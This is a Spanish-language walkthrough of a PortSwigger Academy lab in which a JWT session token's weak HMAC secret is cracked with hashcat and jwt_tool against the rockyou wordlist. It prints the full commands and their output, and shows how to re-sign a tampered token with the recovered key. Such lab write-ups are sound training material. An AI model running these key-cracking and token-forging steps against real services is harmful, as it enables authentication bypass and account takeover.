---
description: >-
  https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key
---

# Lab 3: JWT authentication bypass via weak signing key

Primero realizamos login:

```
POST /login HTTP/2
Host: 0a4f009803e12b2885b0545300e0002f.web-security-academy.net
Cookie: session=
Content-Length: 68
Cache-Control: max-age=0
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
Origin: https://0a4f009803e12b2885b0545300e0002f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4f009803e12b2885b0545300e0002f.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=z1CSPfspKEySzbyBFD6VrutwipjnAPbH&username=wiener&password=peter
```

La respuesta de la peticion previa es:

```
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=eyJraWQiOiI2MzIwYzUyOS02ZjNhLTQyMWEtYmY3NC0zYzg4ZWFiZjJjNzUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ1MTI3Niwic3ViIjoid2llbmVyIn0.OzQHzaGE4xN3q5acIT-Wboc7JevVN64zNiZE1dH7WOo; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

Posteriormente, se procede a pasarle el JWT a hashcat:

```
┌──(root㉿SPARTAN-SERVER)-[/home/hacker/BURP]
└─# hashcat -a 0 -m 16500 eyJraWQiOiI2MzIwYzUyOS02ZjNhLTQyMWEtYmY3NC0zYzg4ZWFiZjJjNzUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ1MTI3Niwic3ViIjoid2llbmVyIn0.OzQHzaGE4xN3q5acIT-Wboc7JevVN64zNiZE1dH7WOo /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 9 5900X 12-Core Processor, 16964/33993 MB (8192 MB allocatable), 24MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 6 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

eyJraWQiOiI2MzIwYzUyOS02ZjNhLTQyMWEtYmY3NC0zYzg4ZWFiZjJjNzUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ1MTI3Niwic3ViIjoid2llbmVyIn0.OzQHzaGE4xN3q5acIT-Wboc7JevVN64zNiZE1dH7WOo:secret1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Hash.Target......: eyJraWQiOiI2MzIwYzUyOS02ZjNhLTQyMWEtYmY3NC0zYzg4ZWF...dH7WOo
Time.Started.....: Mon Jun  3 15:48:27 2024 (0 secs)
Time.Estimated...: Mon Jun  3 15:48:27 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   571.2 kH/s (2.94ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 24576/14344385 (0.17%)
Rejected.........: 0/24576 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> 280789

Started: Mon Jun  3 15:48:05 2024
Stopped: Mon Jun  3 15:48:29 2024
```

Para saber el algoritmo o numero de hashcat para JWT podemos filtrar con GREP:

```
┌──(root㉿SPARTAN-SERVER)-[/home/hacker/BURP/jwt_tool]
└─# hashcat -h | grep -i jwt
  16500 | JWT (JSON Web Token)                                       | Network Protocol
```

## Utilizando jwt\_tool

```
┌──(root㉿SPARTAN-SERVER)-[/home/hacker/BURP/jwt_tool]
└─# python3 jwt_tool.py eyJraWQiOiI2MzIwYzUyOS02ZjNhLTQyMWEtYmY3NC0zYzg4ZWFiZjJjNzUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzQ1MTI3Niwic3ViIjoid2llbmVyIn0.OzQHzaGE4xN3q5acIT-Wboc7JevVN64zNiZE1dH7WOo -C -d /usr/share/wo
rdlists/rockyou.txt

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:

[+] secret1 is the CORRECT key!
You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "secret1"
```
